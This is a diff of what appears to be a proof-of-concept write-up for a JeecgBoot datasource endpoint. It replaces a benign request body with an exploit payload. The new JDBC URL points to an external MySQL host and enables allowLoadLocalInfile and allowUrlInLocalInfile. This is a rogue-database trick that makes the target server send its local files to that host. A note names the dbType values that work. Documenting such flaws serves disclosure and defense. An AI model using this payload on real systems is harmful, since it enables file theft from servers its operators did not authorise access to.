@@ -20,7 +20,7 @@ Referer: http://boot3.jeecg.com/monitor/datasource
 X-Sign: D96B6145BFCE44FFFB2C01DCC711BD91
 Content-Length: 269
 
-{"dbType":"4","dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://127.0.0.1:3306/jeecg-boot?characterEncoding=UTF-8&useUnicode=true&useSSL=false&tinyInt1isBit=false&allowPublicKeyRetrieval=true&serverTimezone=Asia/Shanghai","dbUsername":"11","dbPassword":"111"}
+{"dbType":"4","dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","dbUsername":"root","dbPassword":"11112221","dbName":"jeecg-boot"}
 ```
 dbType为4或1
 
